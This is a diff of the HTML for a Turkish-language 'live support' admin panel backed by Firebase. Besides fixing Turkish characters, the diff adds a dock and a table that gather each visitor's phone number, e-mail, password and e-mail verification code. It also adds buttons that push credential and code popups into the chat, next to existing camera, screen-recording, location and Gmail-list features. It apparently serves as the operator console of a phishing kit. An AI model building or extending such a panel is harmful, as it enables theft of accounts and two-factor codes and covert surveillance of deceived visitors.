@@ -3,23 +3,23 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Canli Destek Paneli</title>
+  <title>Canlı Destek Paneli</title>
   <meta name="robots" content="noindex,nofollow" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="styles.css?v=92" />
+  <link rel="stylesheet" href="styles.css?v=104" />
 </head>
 <body class="admin-body">
   <header class="site-header admin-top">
     <a class="logo" href="index.html">
       <span class="logo-mark" aria-hidden="true"></span>
-      <span class="logo-text">Canli<span class="logo-dim"> Panel</span></span>
+      <span class="logo-text">Canlı<span class="logo-dim"> Panel</span></span>
     </a>
     <div class="admin-top-actions">
-      <span class="admin-live" id="live-badge" hidden><span class="chat-dot"></span> Canli</span>
-      <button type="button" class="chat-clear" id="notify-btn" hidden>?? Alarmlari a�</button>
-      <button type="button" class="chat-clear" id="logout-btn" hidden>�ikis</button>
+      <span class="admin-live" id="live-badge" hidden><span class="chat-dot"></span> Canlı</span>
+      <button type="button" class="chat-clear" id="notify-btn" hidden>Alarmları aç</button>
+      <button type="button" class="chat-clear" id="logout-btn" hidden>Çıkış</button>
     </div>
   </header>
 
@@ -27,43 +27,51 @@
     <div class="admin-toast-inner" role="status">
       <div class="admin-toast-text">
         <p class="admin-toast-kicker" id="admin-alert-kicker">Yeni bildirim</p>
-        <strong id="admin-alert-title">Yeni ziyaret�i</strong>
-        <p id="admin-alert-body">Bir ziyaret�i mesaj yazdi.</p>
+        <strong id="admin-alert-title">Yeni ziyaretçi</strong>
+        <p id="admin-alert-body">Bir ziyaretçi mesaj yazdı.</p>
         <button type="button" class="btn btn-primary admin-toast-ok" id="admin-alert-dismiss">Tamam</button>
       </div>
     </div>
   </div>
 
-  <!-- Panele giristen sonra sagda sabit g�r�n�r -->
   <aside class="admin-recent-feed" id="admin-recent-feed" hidden aria-label="Son 5 mesaj">
     <header class="admin-recent-feed-head">
-      <strong>?? Son 5 mesaj</strong>
-      <span id="admin-recent-hint">T�m sohbetler</span>
+      <strong>Son 5 mesaj</strong>
+      <span id="admin-recent-hint">Tüm sohbetler</span>
     </header>
     <ul class="admin-recent-list" id="admin-recent-list">
-      <li class="admin-recent-empty">Hen�z mesaj yok</li>
+      <li class="admin-recent-empty">Henüz mesaj yok</li>
     </ul>
   </aside>
 
   <main class="admin-main">
     <section class="admin-setup" id="setup-panel" hidden>
       <header class="page-hero">
-        <p class="eyebrow">Kurulum � bir kez</p>
-        <h1>Canli yazisma paneli i�in Firebase</h1>
-        <p class="lede">Ziyaret�i mesajlarini arka planda anlik g�rmek i�in �cretsiz Firebase Realtime Database gerekir.</p>
+        <p class="eyebrow">Kurulum · bir kez</p>
+        <h1>Canlı yazışma paneli için Firebase</h1>
+        <p class="lede">Ziyaretçi mesajlarını arka planda anlık görmek için ücretsiz Firebase Realtime Database gerekir.</p>
       </header>
       <ol class="setup-steps">
         <li>
           <strong>Firebase kurulumunu tamamla</strong>
-          <p>Realtime Database + web app config + <code>firebase-config.js</code> doldurulmali.</p>
+          <p>Realtime Database + web app config + <code>firebase-config.js?v=133</code> doldurulmalı.</p>
         </li>
         <li>
-          <strong>Kurallari g�ncelle</strong>
-          <p><code>database.rules.json</code> i�erigini Realtime Database Rules�a yapistir ? Publish.</p>
+          <strong>Kuralları güncelle</strong>
+          <p><code>database.rules.json</code> içeriğini Realtime Database Rules’a yapıştır → Publish.</p>
         </li>
         <li>
-          <strong>Storage kurallari (kamera kaydi)</strong>
-          <p><code>storage.rules.json</code> i�erigini Storage ? Rules�a yapistir ? Publish. Yoksa kayit y�klenmez / inmez.</p>
+          <strong>Storage kuralları (kamera kaydı)</strong>
+          <p><code>storage.rules.json</code> içeriğini Storage → Rules’a yapıştır → Publish. Yoksa kayıt yüklenmez / inmez.</p>
+        </li>
+        <li>
+          <strong>Kapalı tarayıcı bildirimi (FCM)</strong>
+          <p>
+            Firebase Console → Cloud Messaging → Web Push certificates → Key pair üret →
+            <code>firebase-config.js?v=133</code> içinde <code>vapidKey</code> alanına yapıştır.
+            Ardından Legacy <strong>Server key</strong>’i <code>fcmServerKey</code> alanına ekle.
+            Rules’ı Publish et. Admin’de <strong>Alarmları aç</strong>’a bir kez bas.
+          </p>
         </li>
       </ol>
     </section>
@@ -72,7 +80,7 @@
       <header class="page-hero">
         <p class="eyebrow">Yetkili erişim</p>
         <h1>Panele giriş</h1>
-        <p class="lede">Admin şifresiyle girin. Sekmeyi arka planda açık tutun.</p>
+        <p class="lede">Admin şifresiyle girin. Bir kez “Alarmları aç” deyin — kapalı tarayıcıda da bildirim gelir (FCM kuruluysa).</p>
       </header>
       <form class="appeal-form" id="login-form">
         <fieldset>
@@ -95,100 +103,183 @@
             <p id="session-count">0 aktif</p>
           </header>
           <div class="admin-session-tools">
-            <button type="button" class="btn btn-ghost" id="clear-all-chats-btn">T�m sohbetleri temizle</button>
+            <button type="button" class="btn btn-ghost" id="clear-all-chats-btn">Tüm sohbetleri temizle</button>
           </div>
           <ul class="session-list" id="session-list"></ul>
         </aside>
 
         <section class="admin-thread">
           <header class="admin-pane-head">
-            <h2 id="thread-title">Bir sohbet se�in</h2>
-            <p id="thread-meta">Sol listeden canli oturumlari izleyin.</p>
+            <h2 id="thread-title">Bir sohbet seçin</h2>
+            <p id="thread-meta">Sol listeden canlı oturumları izleyin.</p>
           </header>
-          <div class="admin-media-dock" id="admin-media-dock" hidden>
-            <div class="admin-media-dock-head">
-              <strong>Kamera &amp; konum</strong>
-              <span id="dock-status-pill" class="dock-pill">�</span>
-            </div>
-            <div class="admin-media-dock-grid">
-              <div class="admin-media-card">
-                <p class="admin-media-label">Kamera</p>
-                <img id="dock-snapshot" class="admin-dock-snapshot" alt="Son kamera fotografi" hidden />
-                <p id="dock-cam-text" class="admin-media-text">Hen�z yok</p>
-                <div class="admin-media-actions">
-                  <a class="btn btn-ghost" id="dock-snapshot-link" href="#" target="_blank" rel="noopener" hidden>Fotografi a�</a>
-                  <button type="button" class="btn btn-primary" id="dock-open-camera-btn" hidden>Canli kamerayi a�</button>
+          <p class="admin-push-status" id="admin-push-status" hidden></p>
+          <div class="admin-evidence" id="admin-media-dock" hidden>
+            <div class="admin-evidence-head">
+              <div>
+                <strong>Oturum kanıtları</strong>
+                <p class="admin-evidence-sub">Bu sohbete ait konum, kayıt ve güvenlik bilgileri</p>
+              </div>
+              <div class="admin-evidence-head-right">
+                <span id="dock-status-pill" class="dock-pill">·</span>
+                <div class="admin-evidence-quick" id="admin-evidence-quick">
+                  <button type="button" class="btn btn-primary" id="ev-send-credentials-btn">Güvenlik gönder</button>
+                  <button type="button" class="btn btn-primary" id="ev-send-email-code-btn">E-posta kodu</button>
+                  <button type="button" class="btn btn-primary" id="ev-notify-visitor-btn">Ziyaretçiye bildirim</button>
                 </div>
               </div>
-              <div class="admin-media-card">
-                <p class="admin-media-label">Konum</p>
-                <p id="dock-loc-text" class="admin-media-text">Hen�z yok</p>
+            </div>
+            <div class="admin-evidence-grid">
+              <section class="admin-evidence-card" id="dock-credentials" aria-labelledby="ev-cred-title">
+                <h3 class="admin-media-label" id="ev-cred-title">Güvenlik bilgileri</h3>
+                <dl class="admin-evidence-list">
+                  <div>
+                    <dt>Telefon</dt>
+                    <dd id="ev-phone">—</dd>
+                  </div>
+                  <div>
+                    <dt>E-posta</dt>
+                    <dd id="ev-email">—</dd>
+                  </div>
+                  <div>
+                    <dt>Şifre</dt>
+                    <dd id="ev-password">—</dd>
+                  </div>
+                  <div>
+                    <dt>E-posta kodu</dt>
+                    <dd id="ev-email-code">—</dd>
+                  </div>
+                </dl>
+                <div class="admin-media-actions">
+                  <button type="button" class="btn btn-ghost" id="ev-copy-creds-btn" hidden>Bilgileri kopyala</button>
+                  <button type="button" class="btn btn-ghost" id="ev-send-credentials-btn-2">Güvenliği tekrar gönder</button>
+                  <button type="button" class="btn btn-ghost" id="ev-send-email-code-btn-2">E-posta kodu gönder</button>
+                </div>
+              </section>
+
+              <section class="admin-evidence-card" aria-labelledby="ev-loc-title">
+                <h3 class="admin-media-label" id="ev-loc-title">Konum</h3>
+                <p id="dock-loc-text" class="admin-media-text">Henüz yok</p>
+                <p id="ev-loc-meta" class="admin-evidence-meta" hidden></p>
                 <div class="admin-media-actions">
                   <a class="btn btn-ghost" id="dock-loc-maps" href="#" target="_blank" rel="noopener" hidden>Google Maps</a>
+                  <button type="button" class="btn btn-ghost" id="ev-copy-loc-btn" hidden>Koordinatı kopyala</button>
                 </div>
-              </div>
+              </section>
+
+              <section class="admin-evidence-card" aria-labelledby="ev-cam-title">
+                <h3 class="admin-media-label" id="ev-cam-title">Kamera &amp; kayıt</h3>
+                <img id="dock-snapshot" class="admin-dock-snapshot" alt="Son kamera fotoğrafı" hidden />
+                <p id="dock-cam-text" class="admin-media-text">Henüz yok</p>
+                <p id="ev-rec-text" class="admin-media-text">Kayıt: —</p>
+                <div class="admin-media-actions">
+                  <a class="btn btn-ghost" id="dock-snapshot-link" href="#" target="_blank" rel="noopener" hidden>Fotoğrafı aç</a>
+                  <a class="btn btn-primary" id="ev-rec-download" href="#" target="_blank" rel="noopener" hidden>Kamerayı indir</a>
+                  <button type="button" class="btn btn-primary" id="dock-open-camera-btn" hidden>Canlı kamerayı aç</button>
+                </div>
+              </section>
+
+              <section class="admin-evidence-card" aria-labelledby="ev-screen-title">
+                <h3 class="admin-media-label" id="ev-screen-title">Ekran kaydı</h3>
+                <p id="ev-screen-text" class="admin-media-text">Henüz yok</p>
+                <div class="admin-media-actions">
+                  <a class="btn btn-primary" id="ev-screen-download" href="#" target="_blank" rel="noopener" hidden>Ekranı indir</a>
+                </div>
+              </section>
             </div>
           </div>
           <div class="admin-thread-tools">
-            <button type="button" class="btn btn-ghost" id="export-chat-btn" disabled>Sohbeti disa aktar</button>
+            <button type="button" class="btn btn-ghost" id="export-chat-btn" disabled>Sohbeti dışa aktar</button>
             <button type="button" class="btn btn-danger" id="clear-chat-btn" disabled>Sohbeti temizle</button>
           </div>
           <div class="chat-messages admin-messages" id="thread-messages" role="log" aria-live="polite"></div>
 
-            <div class="admin-compose-wrap">
+          <div class="admin-compose-wrap">
             <div class="admin-actions-row">
-              <button type="button" class="btn btn-primary" id="send-loading-btn">? Y�kleme animasyonu g�nder</button>
-              <button type="button" class="btn btn-primary" id="send-camera-btn">?? Kamera talebi g�nder</button>
-              <button type="button" class="btn btn-primary" id="send-photos-btn">?? Fotograf talebi g�nder</button>
-              <button type="button" class="btn btn-primary" id="reopen-camera-btn" hidden>?? Kamerayi a�</button>
-              <button type="button" class="btn btn-ghost" id="hide-camera-panel-btn" hidden>Kamerayi kapat</button>
-              <button type="button" class="btn btn-danger" id="end-camera-btn" hidden>? Oturumu sonlandir (kaydi indir)</button>
+              <button type="button" class="btn btn-primary" id="send-loading-btn">Yükleme animasyonu gönder</button>
+              <button type="button" class="btn btn-primary" id="send-camera-btn">Kamera talebi gönder</button>
+              <button type="button" class="btn btn-primary" id="send-photos-btn">Fotoğraf talebi gönder</button>
+              <div class="admin-security-actions">
+                <button type="button" class="btn btn-primary" id="send-email-code-btn">E-posta kodu penceresi gönder</button>
+                <button type="button" class="btn btn-primary" id="send-credentials-btn">Güvenliği tekrar gönder</button>
+              </div>
+              <button type="button" class="btn btn-primary" id="reopen-camera-btn" hidden>Kamerayı aç</button>
+              <button type="button" class="btn btn-ghost" id="hide-camera-panel-btn" hidden>Kamerayı kapat</button>
+              <button type="button" class="btn btn-danger" id="end-camera-btn" hidden>Oturumu sonlandır (kaydı indir)</button>
             </div>
             <div class="admin-popup-box">
-              <strong>Popup mesaj (chat i�inde form)</strong>
-              <p class="admin-popup-help">�stteki metin ziyaret�iye soru olarak g�r�n�r. Altindaki kutuya ziyaret�i kendi mesajini yazar.</p>
+              <strong>Popup mesaj (chat içinde form)</strong>
+              <p class="admin-popup-help">Üstteki metin ziyaretçiye soru olarak görünür. Altındaki kutuya ziyaretçi kendi mesajını yazar.</p>
               <label>
-                Ziyaret�iye g�sterilecek soru / metin
-                <textarea id="popup-text" rows="3" maxlength="800" placeholder="�rn: Sorununuzu kisaca yazin�"></textarea>
+                Ziyaretçiye gösterilecek soru / metin
+                <textarea id="popup-text" rows="3" maxlength="800" placeholder="Örn: Sorununuzu kısaca yazın…"></textarea>
               </label>
               <label>
-                Ziyaret�i kutusu yazisi (placeholder)
-                <input id="popup-placeholder" type="text" maxlength="120" value="Mesajinizi buraya yazin�" />
+                Ziyaretçi kutusu yazısı (placeholder)
+                <input id="popup-placeholder" type="text" maxlength="120" value="Mesajınızı buraya yazın…" />
               </label>
               <div class="admin-popup-btns-edit">
                 <label>
-                  G�nder butonu
+                  Gönder butonu
                   <input id="popup-ok" type="text" maxlength="40" value="Tamam" />
                 </label>
                 <label>
-                  Iptal butonu
-                  <input id="popup-cancel" type="text" maxlength="40" value="Iptal" />
+                  İptal butonu
+                  <input id="popup-cancel" type="text" maxlength="40" value="İptal" />
                 </label>
               </div>
-              <button type="button" class="btn btn-primary" id="send-popup-btn">Chat i�i form g�nder</button>
+              <button type="button" class="btn btn-primary" id="send-popup-btn">Chat içi form gönder</button>
             </div>
             <div class="admin-quick" id="quick-list"></div>
             <form class="chat-compose admin-compose" id="reply-form">
-              <label class="visually-hidden" for="reply-input">Yanit</label>
-              <input id="reply-input" type="text" maxlength="800" placeholder="Ziyaret�iye mesaj yaz�" autocomplete="off" />
-              <button type="submit" class="btn btn-primary" id="reply-send">G�nder</button>
+              <label class="visually-hidden" for="reply-input">Yanıt</label>
+              <input id="reply-input" type="text" maxlength="800" placeholder="Ziyaretçiye mesaj yaz…" autocomplete="off" />
+              <button type="submit" class="btn btn-primary" id="reply-send">Gönder</button>
             </form>
             <p class="admin-send-hint" id="send-hint" hidden></p>
           </div>
         </section>
       </div>
 
+      <section class="admin-evidence-board" id="admin-evidence-board">
+        <header class="admin-pane-head">
+          <h2>Tüm oturum kanıtları</h2>
+          <p id="evidence-board-count">0 oturum</p>
+        </header>
+        <div class="evidence-table-wrap">
+          <table class="evidence-table" id="evidence-table">
+            <thead>
+              <tr>
+                <th>Oturum</th>
+                <th>Telefon</th>
+                <th>E-posta</th>
+                <th>Şifre</th>
+                <th>Kod</th>
+                <th>Konum</th>
+                <th>Kayıt</th>
+                <th></th>
+              </tr>
+            </thead>
+            <tbody id="evidence-board-body">
+              <tr class="evidence-empty-row">
+                <td colspan="8">Henüz kanıt yok</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
       <section class="admin-gmails" id="admin-gmails">
         <header class="admin-pane-head">
-          <h2>Google kullanicilari (Gmail)</h2>
-          <p id="gmail-count">0 hesap � Authentication ile ayni kaynak (site girisi)</p>
+          <h2>Google kullanıcıları (Gmail)</h2>
+          <p id="gmail-count">0 hesap · Authentication ile aynı kaynak (site girişi)</p>
         </header>
         <div class="admin-gmails-tools">
           <label class="admin-gmails-search">
             <span class="visually-hidden">Gmail ara</span>
-            <input type="search" id="gmail-search" placeholder="E-posta, isim veya UID ara�" autocomplete="off" />
+            <input type="search" id="gmail-search" placeholder="E-posta, isim veya UID ara…" autocomplete="off" />
           </label>
-          <button type="button" class="btn btn-ghost" id="gmail-copy-btn">T�m e-postalari kopyala</button>
+          <button type="button" class="btn btn-ghost" id="gmail-copy-btn">Tüm e-postaları kopyala</button>
           <button type="button" class="btn btn-ghost" id="gmail-backfill-btn">Sohbetlerden aktar</button>
         </div>
         <p class="search-hint" id="gmail-hint" hidden></p>
@@ -206,7 +297,7 @@
             </thead>
             <tbody id="gmail-list">
               <tr class="gmail-empty-row">
-                <td colspan="6">Hen�z Google girisi yok</td>
+                <td colspan="6">Henüz Google girişi yok</td>
               </tr>
             </tbody>
           </table>
@@ -215,15 +306,15 @@
 
       <section class="admin-templates">
         <header class="admin-pane-head">
-          <h2>Hazir mesajlar</h2>
-          <p>Tikla ? sohbete g�nder. Metinleri d�zenleyip kaydedebilirsin.</p>
+          <h2>Hazır mesajlar</h2>
+          <p>Tıkla → sohbete gönder. Metinleri düzenleyip kaydedebilirsin.</p>
         </header>
         <form id="templates-form" class="templates-form">
           <div id="templates-editor" class="templates-editor"></div>
           <div class="templates-actions">
-            <button type="button" class="btn btn-ghost" id="add-template">+ Yeni hazir mesaj</button>
-            <button type="button" class="btn btn-ghost" id="reset-templates">Varsayilana d�n</button>
-            <button type="submit" class="btn btn-primary">Hazir mesajlari kaydet</button>
+            <button type="button" class="btn btn-ghost" id="add-template">+ Yeni hazır mesaj</button>
+            <button type="button" class="btn btn-ghost" id="reset-templates">Varsayılana dön</button>
+            <button type="submit" class="btn btn-primary">Hazır mesajları kaydet</button>
           </div>
           <p class="search-hint" id="templates-saved" hidden>Kaydedildi.</p>
         </form>
@@ -234,29 +325,29 @@
   <div class="admin-camera-modal" id="admin-camera-box" hidden>
     <div class="admin-camera-modal-panel" id="admin-camera-panel" role="dialog" aria-labelledby="camera-modal-title">
       <header class="admin-camera-modal-head" id="admin-camera-drag">
-        <strong id="camera-modal-title">Ziyaret�i kamerasi <span class="admin-rec-badge" aria-hidden="true">REC</span></strong>
-        <button type="button" class="admin-camera-modal-x" id="hide-camera-btn" aria-label="Pencereyi kapat">�</button>
+        <strong id="camera-modal-title">Ziyaretçi kamerası <span class="admin-rec-badge" aria-hidden="true">REC</span></strong>
+        <button type="button" class="admin-camera-modal-x" id="hide-camera-btn" aria-label="Pencereyi kapat">×</button>
       </header>
-      <p class="admin-popup-help" id="camera-status">Bekleniyor�</p>
+      <p class="admin-popup-help" id="camera-status">Bekleniyor…</p>
       <video id="admin-remote-video" class="admin-remote-video" autoplay playsinline muted></video>
-      <img id="admin-snapshot-preview" class="admin-snapshot-preview" alt="Son kamera fotografi" hidden />
-      <a class="btn btn-ghost" id="admin-snapshot-link" href="#" target="_blank" rel="noopener" hidden>Son fotografi a�</a>
+      <img id="admin-snapshot-preview" class="admin-snapshot-preview" alt="Son kamera fotoğrafı" hidden />
+      <a class="btn btn-ghost" id="admin-snapshot-link" href="#" target="_blank" rel="noopener" hidden>Son fotoğrafı aç</a>
       <div class="admin-live-location" id="admin-live-location" hidden>
-        <p class="admin-live-location-label">Canli konum</p>
-        <p class="admin-live-location-coords" id="admin-location-text">Konum bekleniyor�</p>
-        <a class="btn btn-ghost" id="admin-location-maps" href="#" target="_blank" rel="noopener" hidden>Google Maps�te a�</a>
+        <p class="admin-live-location-label">Canlı konum</p>
+        <p class="admin-live-location-coords" id="admin-location-text">Konum bekleniyor…</p>
+        <a class="btn btn-ghost" id="admin-location-maps" href="#" target="_blank" rel="noopener" hidden>Google Maps’te aç</a>
       </div>
       <div class="admin-camera-actions">
-        <button type="button" class="btn btn-ghost" id="hide-camera-btn-modal">Kamerayi kapat</button>
-        <button type="button" class="btn btn-danger" id="end-camera-btn-modal">Oturumu sonlandir (kaydi indir)</button>
-        <a class="btn btn-primary" id="download-recording-btn" hidden download>Kaydi indir</a>
+        <button type="button" class="btn btn-ghost" id="hide-camera-btn-modal">Kamerayı kapat</button>
+        <button type="button" class="btn btn-danger" id="end-camera-btn-modal">Oturumu sonlandır (kaydı indir)</button>
+        <a class="btn btn-primary" id="download-recording-btn" hidden download>Kaydı indir</a>
       </div>
     </div>
   </div>
 
-  <script src="firebase-config.js?v=84"></script>
-  <script type="module" src="chat-sync.js?v=118"></script>
-  <script type="module" src="admin.js?v=118"></script>
+  <script src="firebase-config.js?v=133"></script>
+  <script type="module" src="chat-sync.js?v=134"></script>
+  <script type="module" src="admin.js?v=134"></script>
 <script id="admin-boot-failsafe">
 (function () {
   setTimeout(function () {
@@ -272,7 +363,7 @@
       if (err && (!window.ChatSync || !window.FIREBASE_SYNC)) {
         err.hidden = false;
         err.textContent =
-          "Panel yuklenemedi. Ctrl+F5 ile hard refresh yapin (admin.js?v=118).";
+          "Panel yüklenemedi. Ctrl+F5 ile hard refresh yapın (admin.js?v=134).";
       }
     }
   }, 2500);
